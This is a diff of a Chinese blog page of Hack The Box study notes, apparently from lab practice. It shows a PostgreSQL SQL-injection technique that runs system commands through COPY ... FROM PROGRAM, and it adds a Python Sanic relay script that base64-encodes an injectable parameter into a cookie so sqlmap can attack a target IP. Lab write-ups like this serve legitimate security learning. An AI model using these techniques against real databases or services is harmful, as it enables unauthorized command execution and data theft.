@@ -5,13 +5,10 @@
 <head>
     <meta charset="utf-8">
     <meta name="keywords" content="HTB学习, 网络安全">
-    <meta name="description" content="
-PostgreSQL  run command
-
-利用PostgreSQL   sql 注入， 使用 copy from 可以执行系统命令
+    <meta name="description" content="1.PostgreSQL  run command利用PostgreSQL   sql 注入， 使用 copy from 可以执行系统命令
 DROP TABLE IF EXISTS cmd_exec;
 
--- Create a table">
+-- Create a table ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -454,7 +451,7 @@ DROP TABLE IF EXISTS cmd_exec;
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    233
+                    452
                 </div>
                 
 
@@ -474,10 +471,7 @@ DROP TABLE IF EXISTS cmd_exec;
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <ol>
-<li><h2 id="PostgreSQL-run-command"><a href="#PostgreSQL-run-command" class="headerlink" title="PostgreSQL  run command"></a>PostgreSQL  run command</h2></li>
-</ol>
-<p>利用PostgreSQL   sql 注入， 使用 copy from 可以执行系统命令</p>
+                <h3 id="1-PostgreSQL-run-command"><a href="#1-PostgreSQL-run-command" class="headerlink" title="1.PostgreSQL  run command"></a>1.PostgreSQL  run command</h3><p>利用PostgreSQL   sql 注入， 使用 copy from 可以执行系统命令</p>
 <pre class="language-none"><code class="language-none">DROP TABLE IF EXISTS cmd_exec;
 
 -- Create a table to contain the result of my command
@@ -502,6 +496,39 @@ COPY cmd_exec FROM PROGRAM 'ls -la / | tr ''\n'' ''$''';
 <li>上传到 Arkime 进行分析</li>
 </ul>
 <p><img src="/assets/image-20220718194335947.png" alt="image-20220718194335947"></p>
+<h3 id="5-sqlmap跑加密参数"><a href="#5-sqlmap跑加密参数" class="headerlink" title="5.sqlmap跑加密参数"></a>5.sqlmap跑加密参数</h3><p>例如 <code>{"id": 20, "output":"dGVzdGFh"}</code> 在提交时必须整个字符串进行base64 编码再提交，其中 id 存在sql注入。</p>
+<p>可以写一个Python或者php脚本，对该请求进行封装</p>
+<p>例如</p>
+<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> sanic <span class="token keyword">import</span> Sanic
+<span class="token keyword">from</span> sanic<span class="token punctuation">.</span>response <span class="token keyword">import</span> text
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> base64
+
+app <span class="token operator">=</span> Sanic<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
+<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    a <span class="token operator">=</span> <span class="token string">'{"id": "'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'", "output": "a"}'</span>
+    <span class="token comment"># print(a)</span>
+    url <span class="token operator">=</span> <span class="token string">"http://142.93.37.65:30874/assets/jquery-3.6.0.slim.min.js"</span>
+    payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
+    cookie <span class="token operator">=</span> <span class="token string">'__cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b; __cfuid='</span><span class="token operator">+</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
+    <span class="token comment"># return text(cookie)</span>
+    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337'</span><span class="token punctuation">,</span>
+        <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
+        <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'*/*'</span><span class="token punctuation">,</span>
+        <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
+        <span class="token string">'Cookie'</span><span class="token punctuation">:</span> cookie
+    <span class="token punctuation">}</span>
+
+    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> text<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+</code></pre>
+
+<p>此时测试时只需要使用sqlmap 扫描该python脚本提供的接口</p>
 
                 
             </div>
@@ -766,18 +793,17 @@ COPY cmd_exec FROM PROGRAM 'ls -la / | tr ''\n'' ''$''';
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;Current
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2022/07/18/htb-xue-xi/">
+                <a href="/2022/07/21/xi-tong-chu-shi-hua-jiao-ben/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="HTB学习">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="系统初始化脚本">
                         
-                        <span class="card-title">HTB学习</span>
+                        <span class="card-title">系统初始化脚本</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -787,9 +813,9 @@ COPY cmd_exec FROM PROGRAM 'ls -la / | tr ''\n'' ''$''';
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-18
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-21
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -798,12 +824,11 @@ COPY cmd_exec FROM PROGRAM 'ls -la / | tr ''\n'' ''$''';
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/HTB/">
-                        <span class="chip bg-color">HTB</span>
+                    <a href="/tags/linux/">
+                        <span class="chip bg-color">linux</span>
                     </a>
                     
                 </div>
@@ -1014,7 +1039,7 @@ COPY cmd_exec FROM PROGRAM 'ls -la / | tr ''\n'' ''$''';
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Words:&nbsp;<span
-                        class="white-color">36.7k</span>
+                        class="white-color">38.2k</span>
             
             
             
